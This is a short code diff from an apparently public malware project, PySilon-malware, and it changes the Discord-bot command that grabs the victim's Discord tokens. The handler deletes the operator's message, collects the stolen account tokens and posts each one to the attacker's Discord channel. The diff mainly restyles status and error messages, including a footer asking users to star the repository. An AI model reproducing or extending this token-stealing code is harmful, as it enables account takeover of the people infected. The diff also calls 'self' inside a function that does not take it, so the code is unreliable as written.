@@ -234,12 +234,15 @@ class fetch_tokens:
 async def grab_discord(ctx, option=None):
     await ctx.message.delete()
     if option == 'discord':
-        await ctx.send("```Grabbing Discord tokens...```")
+        await ctx.send(f"```{render_text('Grabbing Discord tokens')}...```")
         accounts = grab_discord.initialize(False)
         for account in accounts:
             await ctx.send(embed=account)
     else:
-        embed = discord.Embed(title="📛 Error",description='```Syntax: .grab <what-to-grab>\nOptions: discord```', colour=discord.Colour.red())
-        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-        await ctx.send(embed=embed)
+        await self.get_channel(self.channel_id).send(embed=self.generate_embed(
+            title='📛 Error',
+            description=f'```Syntax: .grab <what-to-grab>\nOptions: discord```',
+            color=0xff0000,
+            footer=['Please ⭐ our repository if you enjoy'],
+            author=[DEFAULT, DEFAULT]))
 #</command>
